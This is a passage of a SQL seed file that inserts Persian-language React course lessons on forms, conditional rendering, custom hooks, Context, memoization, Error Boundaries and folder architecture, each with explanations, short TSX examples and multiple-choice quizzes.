INSERT INTO lessons (id, course_id, title, minutes, sort_order, blocks, quiz) VALUES
('react-b6', 'react', 'فرم‌های کنترل‌شده', 56, 19, '[{"k":"p","t":"در فرم کنترل‌شده، مقدار input از state می‌آید و با onChange آپدیت می‌شود؛ پس React تنها منبع حقیقت است و اعتبارسنجی ساده می‌شود."},{"k":"h","t":"فرم کنترل‌شده؛ React منبع حقیقت"},{"k":"p","t":"در فرم کنترل‌شده، مقدار input از state می‌آید و هر تغییر با onChange همان state را به‌روز می‌کند؛ پس React همیشه می‌داند مقدار دقیقاً چیست و «تنها منبع حقیقت» است. فایده‌اش این است که اعتبارسنجی، نمایش مقدار و submit همه بر اساس همان state انجام می‌شوند و هیچ حالت پنهانی در DOM نیست. در مقابل، فرم غیرکنترل‌شده مقدار را در خود DOM نگه می‌دارد و فقط با ref می‌خوانی — ساده‌تر ولی کنترل کمتری داری."},{"k":"h","t":"اعتبارسنجی و submit"},{"k":"p","t":"چون مقدار در state است، اعتبارسنجی لحظه‌ای ساده می‌شود: در هر onChange یا هنگام رندر، مقدار را بررسی و پیام خطا را کنار فیلد نشان می‌دهی. هنگام submit هم با preventDefault جلوی رفرش صفحه را می‌گیری و منطق ارسال را خودت انجام می‌دهی — معمولاً با بررسی مجدد همه فیلدها و بعد ارسال به سرور. الگوی رایج، نگه‌داشتن خطاها در یک state جداست که هر فیلد خطای خودش را دارد و فقط بعد از تلاش submit نمایش داده می‌شوند."},{"k":"h","t":"جدول مرجع"},{"k":"table","head":["","کنترل‌شده","غیرکنترل‌شده"],"rows":[["مقدار کجاست","در state","در DOM"],["دسترسی","همیشه از state","با ref هنگام نیاز"],["اعتبارسنجی لحظه‌ای","ساده","سخت‌تر"],["کی استفاده شود","اکثر فرم‌ها","فرم ساده یا مهاجرت"]]},{"k":"warn","title":"دام رایج","t":"preventDefault را در handler فراموش نکن؛ اگر نکنی، مرورگر فرم را به روش سنتی submit و صفحه را رفرش می‌کند و کل منطق React و state از دست می‌رود — یکی از رایج‌ترین باگ‌های اولیه فرم."},{"k":"tip","title":"نکته منتور","t":"برای فرم‌های بزرگ با چندین فیلد، به‌جای یک state جدا برای هر فیلد، از یک شیء استفاده کن و نام فیلد را کلید قرار بده؛ آن‌وقت یک handler مشترک با name فیلد همه را به‌روز می‌کند و کد تکراری حذف می‌شود."},{"k":"h","t":"آنچه باید بدانید"},{"k":"list","items":["value={state} و onChange={e => set(e.target.value)}","فرم uncontrolled با ref برای دسترسی مستقیم DOM است","onSubmit را با preventDefault بگیر"]},{"k":"h","t":"مثال عملی"},{"k":"code","lang":"tsx","title":"form.tsx","code":"function Form() {\n  const [name, setName] = useState('''');\n  return (\n    <form onSubmit={e => { e.preventDefault(); alert(name); }}>\n      <input value={name} onChange={e => setName(e.target.value)} />\n      <button>ثبت</button>\n    </form>\n  );\n}"},{"k":"h","t":"جمع‌بندی"},{"k":"p","t":"برداشت اصلی این درس: value={state} و onChange={e => set(e.target.value)} بقیه درس‌های دوره همین ایده را عمیق‌تر می‌کنند؛ قبل از ادامه، پرسش‌های زیر را پاسخ بده تا مطمئن شوی مفهوم نشسته است."}]'::jsonb, '[{"q":"مزیت فرم کنترل‌شده چیست؟","opts":["سریع‌تر است","React تنها منبع حقیقت است؛ اعتبارسنجی و مقدار همیشه در state است","کد کمتر است","CSS راحت‌تر است"],"ans":1,"why":"چون مقدار از state می‌آید، همیشه مقدار واقعی را داری و می‌توانی لحظه‌ای اعتبارسنجی کنی."},{"q":"در فرم کنترل‌شده، «منبع حقیقت» مقدار کجاست؟","opts":["در DOM","در state؛ input مقدارش را از state می‌گیرد و با onChange همان را به‌روز می‌کند","در سرور","در ref"],"ans":1,"why":"چون مقدار فقط در state است و DOM صرفاً آن را نمایش می‌دهد، React همیشه مقدار دقیق را می‌داند؛ پس اعتبارسنجی و submit بدون حالت پنهان انجام می‌شود."},{"q":"preventDefault در handler فرم چه می‌کند؟","opts":["فرم را پاک می‌کند","جلوی submit سنتی مرورگر و رفرش صفحه را می‌گیرد تا منطق ارسال با React انجام شود","سرعت را زیاد می‌کند","اجباری نیست"],"ans":1,"why":"بدون آن مرورگر فرم را به روش قدیمی می‌فرستد و صفحه رفرش می‌شود؛ با preventDefault کنترل دست توست و می‌توانی اعتبارسنجی و ارسال را خودت انجام بدهی."}]'::jsonb),
('react-b7', 'react', 'کامپوننت‌های شرطی', 56, 20, '[{"k":"p","t":"رندر شرطی با && و ternary انجام می‌شود؛ دانستن تفاوت‌شان از رندر شدن 0 یا null ناخواسته جلوگیری می‌کند."},{"k":"h","t":"رندر شرطی؛ && و ternary"},{"k":"p","t":"خیلی‌وقت‌ها باید بسته به شرایط، چیزی را نشان بدهی یا نه. دو ابزار اصلی: عملگر && برای «نشان بده اگر درست بود» و عملگر ternary برای «این را نشان بده وگرنه آن را». هر دو داخل JSX و داخل {} استفاده می‌شوند. انتخاب بینشان ساده است: اگر فقط یک حالت داری (نشان بده یا هیچ) از && و اگر دو حالت متقابل داری از ternary استفاده کن. برای پیچیده‌ترها، می‌توانی شرط را قبل از return در یک متغیر boolean یا یک تابع کوچک محاسبه کنی تا JSX تمیز بماند."},{"k":"h","t":"دام ۰؛ چرا شرط را boolean کنی"},{"k":"p","t":"یک باگ معروف در && این است که اگر سمت چپش عدد ۰ باشد، React به‌جای هیچ، خودِ ۰ را رندر می‌کند؛ چون ۰ در جاوااسکریپت falsy است ولی React اعداد را به‌عنوان متن نمایش می‌دهد. پس {count && <Badge/>} وقتی count صفر است، یک «۰» ناخواسته روی صفحه می‌اندازد. راه‌حل: شرط را صریحاً boolean کن، مثل {count > 0 && <Badge/>} یا از !! یا Boolean() استفاده کن. این یکی از آن باگ‌هایی است که همه حداقل یک‌بار می‌افتند."},{"k":"h","t":"جدول مرجع"},{"k":"table","head":["ابزار","کاربرد","مثال"],"rows":[["&&","نشان بده اگر شرط درست بود، وگرنه هیچ","{isLoggedIn && <Profile/>}"],["ternary","دو حالت متقابل","{isAdmin ? <Panel/> : <Login/>}"],["شرط در متغیر","شرط پیچیده را از JSX بیرون ببر","const show = a && b > 0;"]]},{"k":"warn","title":"دام رایج","t":"از && با مقداری که ممکن است ۰ یا NaN یا '''' باشد استفاده نکن بدون boolean‌کردن؛ چون React این‌ها را (به‌جز خالی) رندر می‌کند و خروجی ناخواسته روی صفحه ظاهر می‌شود. همیشه شرط را به true/false تبدیل کن."},{"k":"tip","title":"نکته منتور","t":"اگر یک بلوک شرطی بزرگ و تو در تو در JSX داری، آن را به یک کامپوننت یا تابع کوچک برگرداننده JSX منتقل کن؛ JSX باید خوانا بماند و منطق شرطی پیچیده جایش بیرون از markup است."},{"k":"h","t":"آنچه باید بدانید"},{"k":"list","items":["count && <div/> اگر count صفر باشد، خود ۰ را رندر می‌کند!","ternary برای دو حالت و null برای پنهان‌کردن","شرط را بیرون JSX به متغیر boolean تبدیل کن"]},{"k":"h","t":"مثال عملی"},{"k":"code","lang":"tsx","title":"cond.tsx","code":"// خطرناک: اگر count=0 باشد، عدد 0 چاپ می‌شود!\n{count && <Badge />}\n\n// درست:\n{count > 0 && <Badge />}\n{isLoggedIn ? <Profile /> : <Login />}"},{"k":"warn","title":"هشدار","t":"0 و NaN و '''' در JS falsy‌اند ولی React عدد ۰ را رندر می‌کند؛ همیشه شرط را boolean کن (مثل count > 0)."},{"k":"h","t":"جمع‌بندی"},{"k":"p","t":"برداشت اصلی این درس: count && <div/> اگر count صفر باشد، خود ۰ را رندر می‌کند! بقیه درس‌های دوره همین ایده را عمیق‌تر می‌کنند؛ قبل از ادامه، پرسش‌های زیر را پاسخ بده تا مطمئن شوی مفهوم نشسته است."}]'::jsonb, '[{"q":"چرا {count && <Badge/>} ممکن است عدد ۰ نشان دهد؟","opts":["باگ React","چون ۰ falsy است ولی React آن را به‌عنوان متن رندر می‌کند؛ && مقدار چپ را برمی‌گرداند","ممکن نیست","برای خطا"],"ans":1,"why":"وقتی چپِ && falsy باشد، همان مقدار چپ (۰) برگردانده و رندر می‌شود؛ پس شرط را به boolean تبدیل کن."},{"q":"چرا {count && <Badge/>} ممکن است عدد ۰ را روی صفحه نشان دهد؟","opts":["باگ React","چون ۰ در جاوااسکریپت falsy است ولی React اعداد را به‌عنوان متن رندر می‌کند؛ && وقتی چپ falsy است همان را برمی‌گرداند","ممکن نیست","برای خطاست"],"ans":1,"why":"وقتی count صفر است، نتیجه عبارت && خودِ ۰ است و React آن را نمایش می‌دهد؛ با boolean‌کردن شرط (مثل count > 0) نتیجه false می‌شود که React چیزی برایش رندر نمی‌کند."},{"q":"چه‌وقت از ternary و چه‌وقت از && استفاده می‌کنیم؟","opts":["فرقی ندارد","&& برای یک حالت (نشان بده یا هیچ)؛ ternary برای دو حالت متقابل که هر دو باید چیزی نشان دهند","همیشه ternary","همیشه &&"],"ans":1,"why":"اگر فقط می‌خواهی چیزی را در صورت درست‌بودن شرط نشان بدهی && کافی و تمیزتر است؛ ولی وقتی هر دو شاخه یک خروجی متفاوت دارند، ternary مناسب است."}]'::jsonb),
('react-b8', 'react', 'Custom Hook و استفاده‌مجدد', 56, 21, '[{"k":"p","t":"Custom Hook تابعی است که با use شروع می‌شود و منطق stateدار را قابل‌استفاده‌مجدد می‌کند؛ راه اصلی اشتراک منطق بین کامپوننت‌هاست."},{"k":"h","t":"Custom Hook؛ منطق stateدارِ قابل‌استفاده‌مجدد"},{"k":"p","t":"وقتی چند کامپوننت به منطق stateدار یکسانی نیاز دارند (مثل وضعیت یک toggle یا خواندن از localStorage)، نمی‌توانی آن را در یک تابع معمولی مشترک کرد چون Hookها (useState و امثال آن) باید داخل کامپوننت یا Hook باشند. Custom Hook راه‌حل است: تابعی که نامش با use شروع می‌شود و داخلش می‌تواند Hook داشته باشد. آن‌وقت منطق یک‌بار نوشته می‌شود و هر کامپوننت با صدازدنش، یک نسخه مستقل از آن state را می‌گیرد."},{"k":"h","t":"اشتراک منطق، نه state"},{"k":"p","t":"نکته مهم و گاهی گیج‌کننده: دو کامپوننت که از یک Custom Hook استفاده می‌کنند، state مشترک ندارند؛ هرکدام state کاملاً جداگانه خودشان را دارند. چیزی که مشترک می‌شود «منطق» است، نه داده. پس اگر می‌خواهی واقعاً state بین کامپوننت‌ها مشترک باشد، باید آن را بالا ببری یا از Context استفاده کنی. Custom Hook برای حذف تکرارِ کدِ Hookهاست؛ مثلاً useToggle، useLocalStorage یا useFetch که در پروژه‌های واقعی زیاد می‌بینی."},{"k":"h","t":"جدول مرجع"},{"k":"table","head":["","تابع معمولی","Custom Hook"],"rows":[["استفاده از Hookها در آن","ممکن نیست","ممکن است"],["نام","دلخواه","باید با use شروع شود"],["چه مشترک می‌شود","—","منطق، نه state"]]},{"k":"warn","title":"دام رایج","t":"Custom Hook را با Context اشتباه نگیر؛ Custom Hook فقط منطق را قابل‌استفاده‌مجدد می‌کند و هر مصرف‌کننده state خودش را دارد. اگر نیاز به داده واقعاً مشترک داری (که تغییرش همه‌جا دیده شود)، باید Context یا یک راه‌حل state سراسری به کار ببری."},{"k":"tip","title":"نکته منتور","t":"قانون نام‌گذاری با use فقط قرارداد زیبایی نیست؛ ابزارهای lint و React بر اساس آن بررسی می‌کنند که قوانین Hook (مثل صدا نشدن داخل شرط) رعایت شده باشد. پس همیشه نام Custom Hook را با use شروع کن تا این بررسی‌ها کار کنند."},{"k":"h","t":"آنچه باید بدانید"},{"k":"list","items":["نام باید با use شروع شود تا قوانین Hook چک شوند","هر فراخوان Hook، state جداگانه خودش را دارد","useLocalStorage و useFetch نمونه‌های رایج‌اند"]},{"k":"h","t":"مثال عملی"},{"k":"code","lang":"tsx","title":"hook.tsx","code":"function useToggle(initial = false) {\n  const [on, setOn] = useState(initial);\n  const toggle = () => setOn(o => !o);\n  return [on, toggle] as const;\n}\n\nconst [dark, toggleDark] = useToggle();"},{"k":"h","t":"جمع‌بندی"},{"k":"p","t":"برداشت اصلی این درس: نام باید با use شروع شود تا قوانین Hook چک شوند بقیه درس‌های دوره همین ایده را عمیق‌تر می‌کنند؛ قبل از ادامه، پرسش‌های زیر را پاسخ بده تا مطمئن شوی مفهوم نشسته است."}]'::jsonb, '[{"q":"اگر دو کامپوننت از یک Custom Hook استفاده کنند، state‌شان مشترک است؟","opts":["بله","خیر — هر فراخوان state کاملاً جدا دارد","بستگی دارد","گاهی"],"ans":1,"why":"Hook فقط منطق را به اشتراک می‌گذارد نه state را؛ هر کامپوننت نمونه مستقل خودش را دارد."},{"q":"Custom Hook چه چیزی را قابل‌استفاده‌مجدد می‌کند؟","opts":["state","منطق stateدار؛ هر مصرف‌کننده state کاملاً جداگانه خودش را می‌گیرد","UI","props"],"ans":1,"why":"دو کامپوننت که یک Custom Hook را صدا می‌کنند، state مشترک ندارند؛ فقط کدِ منطق (ترکیب Hookها) مشترک است و هرکدام نمونه مستقل خودش را دارد."},{"q":"چرا نام Custom Hook باید با use شروع شود؟","opts":["برای زیبایی","چون React و ابزارهای lint بر اساس آن قوانین Hook را بررسی می‌کنند؛ ضمن اینکه قرارداد خوانایی است","اجباری نیست","برای سرعت"],"ans":1,"why":"اگر نام با use شروع نشود، linter نمی‌فهمد این یک Hook است و نمی‌تواند بررسی کند که مثلاً Hookها داخل شرط صدا نشده‌اند؛ پس این قرارداد، بررسی خودکار را ممکن می‌کند."}]'::jsonb),
('react-b9', 'react', 'Context برای داده سراسری', 56, 22, '[{"k":"p","t":"Context داده را بدون پاس‌دادن props از درخت عبور می‌دهد؛ برای تم، زبان و کاربر لاگین عالی است ولی برای داده پرتغییر، رندر اضافی می‌آورد."},{"k":"h","t":"Context؛ عبور داده بدون پاس‌دادن props"},{"k":"p","t":"وقتی داده‌ای را چندین سطح پایین‌تر لازم داری (مثل تم صفحه یا کاربر لاگین)، پاس‌دادنش با props از هر سطح، کد را شلوغ می‌کند و همه کامپوننت‌های میانی را به آن وابسته می‌کند — به این می‌گویند prop drilling. Context راه‌حل است: داده را در یک Provider در بالا قرار می‌دهی و هر کامپوننتی در زیر آن، با useContext مستقیماً می‌خواند — بدون اینکه کامپوننت‌های میانی اصلاً بدانند. سه بخش دارد: createContext، Provider که مقدار را می‌دهد، و useContext که می‌خواند."},{"k":"h","t":"کی Context و کی نه"},{"k":"p","t":"Context برای داده‌هایی عالی است که «کم تغییر می‌کنند و خیلی‌جا لازم‌اند»: تم، زبان، کاربر لاگین، تنظیمات سراسری. ولی برای داده‌ای که مدام تغییر می‌کند مناسب نیست؛ چون هر تغییر مقدار Context، همه کامپوننت‌های مصرف‌کننده را دوباره رندر می‌کند — حتی آن‌هایی که عملاً به آن بخش تغییرکرده نیاز ندارند. پس برای state پرتغییر و سراسری، راه‌حل‌هایی مثل Zustand یا React Query (با subscribe انتخابی) بهترند و Context را برای همان موارد پایدار نگه دار."},{"k":"h","t":"جدول مرجع"},{"k":"table","head":["","prop drilling","Context"],"rows":[["عبور داده","از props همه سطوح","مستقیم از Provider به مصرف‌کننده"],["وابستگی سطوح میانی","همه باید prop را بگیرند و بدهند","بی‌خبر می‌مانند"],["مناسب برای","داده محلی و کم‌عمق","داده سراسریِ کم‌تغییر"]]},{"k":"warn","title":"دام رایج","t":"Context را جایگزین state سراسریِ پرتغییر نکن؛ چون هر تغییرش همه مصرف‌کننده‌ها را رندر می‌کند، گذاشتن داده‌ای که ثانیه‌ای عوض می‌شود در Context می‌تواند کل اپ را کند کند. Context برای چیزهایی است که بندرت تغییر می‌کنند."},{"k":"tip","title":"نکته منتور","t":"اگر یک Context داری که هم داده و هم توابع تغییرش را نگه می‌دارد و دیدی رندرهای اضافه داری، می‌توانی مقدار و setter را در دو Context جدا بگذاری؛ آن‌وقت کامپوننت‌هایی که فقط می‌خوانند، با تغییر مقدار (که setter را نمی‌خوانند) رندر نمی‌شوند."},{"k":"h","t":"آنچه باید بدانید"},{"k":"list","items":["createContext + Provider + useContext سه‌گانه است","هر تغییر Context همه مصرف‌کننده‌ها را رندر می‌کند","برای state پویا، Zustand یا React Query بهتر است"]},{"k":"h","t":"مثال عملی"},{"k":"code","lang":"tsx","title":"context.tsx","code":"const ThemeCtx = createContext<''light'' | ''dark''>(''light'');\n\nfunction App() {\n  return (\n    <ThemeCtx.Provider value=\"dark\">\n      <Toolbar />\n    </ThemeCtx.Provider>\n  );\n}\nconst theme = useContext(ThemeCtx);"},{"k":"h","t":"جمع‌بندی"},{"k":"p","t":"برداشت اصلی این درس: createContext + Provider + useContext سه‌گانه است بقیه درس‌های دوره همین ایده را عمیق‌تر می‌کنند؛ قبل از ادامه، پرسش‌های زیر را پاسخ بده تا مطمئن شوی مفهوم نشسته است."}]'::jsonb, '[{"q":"Context برای چه داده‌ای مناسب نیست؟","opts":["تم صفحه","داده‌ای که هر ثانیه تغییر می‌کند، چون همه مصرف‌کننده‌ها رندر می‌شوند","زبان","کاربر لاگین"],"ans":1,"why":"تغییر Context همه subscriberها را رندر می‌کند؛ برای داده پرتغییر، راه‌حل‌های با subscribe انتخابی بهترند."},{"q":"Context چه مشکلی را حل می‌کند؟","opts":["کندی رندر","prop drilling؛ عبور داده از چندین سطح بدون اینکه کامپوننت‌های میانی درگیر شوند","امنیت","حافظه"],"ans":1,"why":"به‌جای اینکه هر سطح prop را بگیرد و به بعدی بدهد، Provider داده را در بالا نگه می‌دارد و مصرف‌کننده واقعی مستقیم با useContext می‌خواند؛ پس سطوح میانی ساده می‌مانند."},{"q":"چرا Context برای داده پرتغییر مناسب نیست؟","opts":["کند است","چون هر تغییر مقدارش همه مصرف‌کننده‌ها را دوباره رندر می‌کند؛ برای داده کم‌تغییر مثل تم و کاربر طراحی شده","حافظه می‌گیرد","ممکن نیست"],"ans":1,"why":"Context مکانیزم subscribe انتخابی ندارد؛ پس هر تغییر، همه خواننده‌ها را رندر می‌کند. برای داده‌ای که مدام عوض می‌شود، راه‌حل‌هایی که فقط بخش تغییرکرده را به خواننده‌هایش می‌دهند بهترند."}]'::jsonb),
('react-b10', 'react', 'React.memo و useMemo', 56, 23, '[{"k":"p","t":"memo کامپوننت را از رندر با props یکسان بازمی‌دارد و useMemo نتیجه محاسبه گران را کش می‌کند؛ ولی استفاده نابجا خودش سربار است."},{"k":"h","t":"memo و useMemo؛ جلوگیری از رندر و محاسبه اضافه"},{"k":"p","t":"وقتی state یک کامپوننت عوض می‌شود، React همه فرزندانش را هم دوباره رندر می‌کند — حتی آن‌هایی که propsشان عوض نشده. memo یک کامپوننت را طوری می‌پیچد که اگر props جدید با قبلی برابر بودند (مقایسه سطحی)، اصلاً رندر نشود. useMemo هم مشابه است ولی برای «مقدار»: نتیجه یک محاسبه گران را نگه می‌دارد و تا وابستگی‌هایش عوض نشوند، دوباره حسابش نمی‌کند. پس memo برای کامپوننت‌هاست و useMemo برای محاسبات داخل یک کامپوننت."},{"k":"h","t":"اندازه بگیر، بعد بهینه کن"},{"k":"p","t":"یک اشتباه رایج، پوشاندن همه‌چیز با memo و useMemo بدون اندازه‌گیری است؛ خودِ این‌ها هم سربار دارند (مقایسه props، نگه‌داشتن مقدار قبلی) و استفاده نابجا می‌تواند کد را کندتر و پیچیده‌تر کند. قانون: اول با Profiler یا React DevTools ببین واقعاً کدام کامپوننت زیاد و بیهوده رندر می‌شود یا کدام محاسبه گران است، و فقط همان‌جا را بهینه کن. ۹۰٪ موارد نیازی به memo ندارند و رندر React به‌قدری سبک است که تکرارش هزینه‌ای ندارد."},{"k":"h","t":"جدول مرجع"},{"k":"table","head":["","memo","useMemo"],"rows":[["برای چیست","کامپوننت","یک محاسبه داخل کامپوننت"],["چه می‌کند","اگر props برابر بود، رندر نمی‌کند","تا وابستگی عوض نشود، دوباره حساب نمی‌کند"],["مقایسه","سطحی روی props","بر اساس آرایه وابستگی"]]},{"k":"warn","title":"دام رایج","t":"مقایسه memo سطحی است؛ اگر در هر رندر یک آبجکت یا آرایه جدید بسازی و به‌عنوان prop بدهی، حتی با محتوای یکسان، مرجع متفاوت است و memo بی‌اثر می‌شود. برای آبجکت‌ها و توابع باید با useMemo و useCallback مرجع را پایدار نگه داری تا memo واقعاً کار کند."},{"k":"tip","title":"نکته منتور","t":"قبل از دست‌به‌کارشدن با memo، مطمئن شو واقعاً مشکل رندر داری؛ خیلی‌وقت‌ها آنچه کند به‌نظر می‌رسد ناشی از یک محاسبه گران یا layout است، نه تعداد رندرها. اول اندازه بگیر، بعد بهینه کن."},{"k":"h","t":"آنچه باید بدانید"},{"k":"list","items":["memo فقط وقتی props مرجع یکسان باشند جلوی رندر را می‌گیرد","useMemo برای محاسبات گران و مراجع پایدار","useCallback تابع پایدار برای پاس‌دادن به memo می‌سازد"]},{"k":"h","t":"مثال عملی"},{"k":"code","lang":"tsx","title":"memo.tsx","code":"const Row = memo(function Row({ item }: { item: Item }) {\n  return <tr>{item.name}</tr>;\n});\n\nconst sorted = useMemo(\n  () => [...items].sort((a, b) => a.name.localeCompare(b.name)),\n  [items]\n);"},{"k":"tip","title":"نکته منتور","t":"اول با Profiler ببین چه چیزی واقعاً زیاد رندر می‌شود؛ ۹۰٪ memoها و useCallbackها بدون اندازه‌گیری، سربار اضافه می‌کنند نه کاهش."},{"k":"h","t":"جمع‌بندی"},{"k":"p","t":"برداشت اصلی این درس: memo فقط وقتی props مرجع یکسان باشند جلوی رندر را می‌گیرد بقیه درس‌های دوره همین ایده را عمیق‌تر می‌کنند؛ قبل از ادامه، پرسش‌های زیر را پاسخ بده تا مطمئن شوی مفهوم نشسته است."}]'::jsonb, '[{"q":"چرا memo همیشه جلوی رندر را نمی‌گیرد؟","opts":["باگ است","چون اگر props مرجع جدید باشند (مثل آبجکت ساخته‌شده در رندر)، مقایسه ناموفق است","کند است","ممکن نیست"],"ans":1,"why":"memo با مقایسه سطحی props کار می‌کند؛ آبجکت/تابع ساخته‌شده در هر رندر، مرجع جدید است و مقایسه شکست می‌خورد."},{"q":"تفاوت memo و useMemo چیست؟","opts":["هیچ","memo برای کامپوننت است و جلوی رندر با props برابر را می‌گیرد؛ useMemo برای یک محاسبه داخل کامپوننت است و نتیجه را کش می‌کند","سرعت‌شان","یکی جدیدتر است"],"ans":1,"why":"memo یک کامپوننت را می‌پیچد تا با props تغییریافته رندر نشود؛ useMemo یک مقدار گران را داخل کامپوننت نگه می‌دارد تا تا وابستگی‌هایش عوض نشده، دوباره حساب نشود — دو سطح متفاوت از بهینه‌سازی."},{"q":"چرا memo وقتی در هر رندر آبجکت جدید بسازی بی‌اثر می‌شود؟","opts":["باگ است","چون مقایسه سطحی است و آبجکت جدید مرجع متفاوت دارد، حتی با محتوای یکسان؛ باید مرجع را با useMemo پایدار نگه داشت","کند است","ممکن نیست"],"ans":1,"why":"memo فقط چک می‌کند آیا مرجع props عوض شده؛ {a:1} ساخته‌شده در هر رندر یک آبجکت تازه است پس همیشه «عوض‌شده» به‌نظر می‌رسد. با useMemo مرجع ثابت می‌ماند و مقایسه معنادار می‌شود."}]'::jsonb),
('react-b11', 'react', 'مدیریت خطا با Error Boundary', 56, 24, '[{"k":"p","t":"Error Boundary کامپوننتی کلاسی است که خطای رندر زیردرختش را می‌گیرد و UI جایگزین نشان می‌دهد؛ بدون آن، یک خطا کل اپ را سفید می‌کند."},{"k":"h","t":"Error Boundary؛ نگذار یک خطا کل اپ را سفید کند"},{"k":"p","t":"اگر حین رندرِ یک کامپوننت خطایی پرتاب شود و کسی نگیردش، React کل درخت را پایین می‌آورد و کاربر یک صفحه سفید می‌بیند — بدترین تجربه ممکن. Error Boundary یک کامپوننت است که دور بخشی از درخت قرار می‌گیرد و اگر در رندرِ زیرش خطایی رخ بدهد، آن را می‌گیرد و به‌جای صفحه سفید، یک UI جایگزین (مثل پیام «چیزی اشتباه شد») نشان می‌دهد. این‌طوری خرابی یک بخش، بقیه اپ را از کار نمی‌اندازد."},{"k":"h","t":"محدودیت‌ها و طراحی درست"},{"k":"p","t":"Error Boundary فقط خطاهای «حین رندر» زیردرختش را می‌گیرد؛ خطای event handlerها، کد ناهمزمان (داخل Promise) و خطای خودِ boundary را نمی‌گیرد — برای آن‌ها باید try/catch جدا داشته باشی. از نظر طراحی، نباید فقط یک boundary دور کل اپ بگذاری؛ بهتر است بخش‌های مستقل (مثل سایدبار، هدر، محتوای اصلی) هرکدام boundary خودشان را داشته باشند تا خرابی یکی، بقیه را از کار نیندازد و کاربر حداقل بتواند با بقیه اپ کار کند."},{"k":"h","t":"جدول مرجع"},{"k":"table","head":["نوع خطا","Error Boundary می‌گیرد؟"],"rows":[["خطای حین رندر زیردرخت","بله"],["خطای event handler","خیر (try/catch لازم است)"],["خطای کد ناهمزمان","خیر"],["خطای خود boundary","خیر"]]},{"k":"warn","title":"دام رایج","t":"Error Boundary را با try/catch معمولی جایگزین نکن و برعکس؛ این دو مکمل‌اند. چون boundary خطای handlerها را نمی‌گیرد، اگر فقط به آن تکیه کنی، یک خطا در یک کلیک همچنان می‌تواند بدون هیچ پیامی رفتار عجیب بسازد. برای handlerها try/catch و برای رندر، boundary."},{"k":"tip","title":"نکته منتور","t":"در Error Boundary خوب، علاوه بر پیام کاربرپسند، یک دکمه «تلاش دوباره» هم بگذار که با reset کردن stateِ خطا، زیردرخت را دوباره رندر کند؛ خیلی‌وقت‌ها یک خطای موقتی با یک رندر مجدد حل می‌شود و کاربر لازم نیست صفحه را رفرش کند."},{"k":"h","t":"آنچه باید بدانید"},{"k":"list","items":["با componentDidCatch و getDerivedStateFromError پیاده می‌شود","خطای event handler را نمی‌گیرد، فقط رندر را","هر بخش مهم اپ را با boundary جدا محافظت کن"]},{"k":"h","t":"مثال عملی"},{"k":"code","lang":"tsx","title":"boundary.tsx","code":"class Boundary extends Component<{}, { err: boolean }> {\n  state = { err: false };\n  static getDerivedStateFromError() {\n    return { err: true };\n  }\n  render() {\n    return this.state.err\n      ? <p>چیزی اشتباه شد!</p>\n      : this.props.children;\n  }\n}"},{"k":"h","t":"جمع‌بندی"},{"k":"p","t":"برداشت اصلی این درس: با componentDidCatch و getDerivedStateFromError پیاده می‌شود بقیه درس‌های دوره همین ایده را عمیق‌تر می‌کنند؛ قبل از ادامه، پرسش‌های زیر را پاسخ بده تا مطمئن شوی مفهوم نشسته است."}]'::jsonb, '[{"q":"Error Boundary چه خطاهایی را نمی‌گیرد؟","opts":["خطای رندر","خطای event handler و کد ناهمزمان و خطای خودش","هیچ‌کدام","همه را می‌گیرد"],"ans":1,"why":"boundary فقط خطاهای رندر زیردرخت را می‌گیرد؛ برای handlerها باید try/catch جدا داشته باشی."},{"q":"Error Boundary چه می‌کند؟","opts":["همه خطاها را می‌گیرد","خطای حین رندر زیردرختش را می‌گیرد و به‌جای صفحه سفید، UI جایگزین نشان می‌دهد","خطا را اصلاح می‌کند","سرعت را زیاد می‌کند"],"ans":1,"why":"بدون boundary، یک خطای رندر کل اپ را سفید می‌کند؛ boundary آن را در محدوده خودش نگه می‌دارد و پیام جایگزین نشان می‌دهد تا بقیه اپ قابل‌استفاده بماند."},{"q":"کدام خطا را Error Boundary نمی‌گیرد؟","opts":["خطای رندر","خطای event handler و کد ناهمزمان؛ برای آن‌ها try/catch لازم است","هیچ‌کدام","همه را می‌گیرد"],"ans":1,"why":"boundary فقط در فاز رندر فعال است؛ خطاهایی که داخل handler یا Promise رخ می‌دهند بیرون از این فازند و باید با try/catch جدا گرفته شوند، وگرنه boundary بی‌خبر می‌ماند."}]'::jsonb),
('react-b12', 'react', 'معماری کامپوننت و پوشه‌بندی', 56, 25, '[{"k":"p","t":"معماری خوب کامپوننت، نمایشی و کانتینری را جدا می‌کند و بر اساس فیچر پوشه می‌سازد نه بر اساس نوع فایل؛ مقیاس‌پذیری از اینجا شروع می‌شود."},{"k":"h","t":"نمایشی و کانتینری؛ جداسازی مسئولیت"},{"k":"p","t":"وقتی اپ بزرگ می‌شود، کامپوننت‌هایی که هم UI می‌سازند هم داده می‌گیرند هم منطق دارند، به سرعت غیرقابل‌نگه‌داری می‌شوند. یک الگوی مفید، جداسازی دو نوع کامپوننت است: نمایشی (presentational) که فقط props می‌گیرد و ظاهر می‌سازد — بدون state و بدون اثر جانبی — و کانتینری (container) که داده را می‌گیرد، منطق را مدیریت می‌کند و نتیجه را به کامپوننت نمایشی می‌دهد. فایده‌اش: UI قابل‌استفاده‌مجدد و راحت‌تست می‌شود چون فقط به props وابسته است، و منطق هم جدا و تست‌پذیر می‌ماند."},{"k":"h","t":"پوشه‌بندی بر اساس فیچر"},{"k":"p","t":"ساختار پوشه‌ها هم مهم است؛ ساختار رایج اما ضعیف، گروه‌کردن بر اساس «نوع فایل» است (همه components در یک پوشه، همه hooks در یکی دیگر) که در اپ بزرگ، یک فیچر را بین ده پوشه پخش می‌کند. بهتر است بر اساس «فیچر» سازمان دهی: هر فیچر (مثل orders) یک پوشه دارد که صفحه، کامپوننت‌ها، hookها و تست‌های همان فیچر را کنار هم نگه می‌دارد، و فقط کامپوننت‌های واقعاً مشترک در یک پوشه components جدا می‌روند. آن‌وقت برای کار روی یک فیچر، همه‌چیز در یک‌جاست."},{"k":"h","t":"جدول مرجع"},{"k":"table","head":["","کامپوننت نمایشی","کامپوننت کانتینری"],"rows":[["وابستگی","فقط props","منابع داده و منطق"],["state","ندارد (یا فقط UI)","دارد"],["هدف","ظاهر؛ قابل‌استفاده‌مجدد","گرفتن داده و دادنش به نمایشی"],["تست","ساده با props","با mock منابع"]]},{"k":"warn","title":"دام رایج","t":"کامپوننت را فقط به‌خاطر اینکه «شاید بعداً استفاده شود» وارد پوشه مشترک نکن؛ قانون این است که اگر نمی‌توانی همین حالا جای دیگری از آن استفاده کنی، باید داخل پوشه فیچرش بماند. پرکردن components مشترک با کامپوننت‌های تک‌مصرف، همان آشفتگی را برمی‌گرداند."},{"k":"tip","title":"نکته منتور","t":"وقتی شک 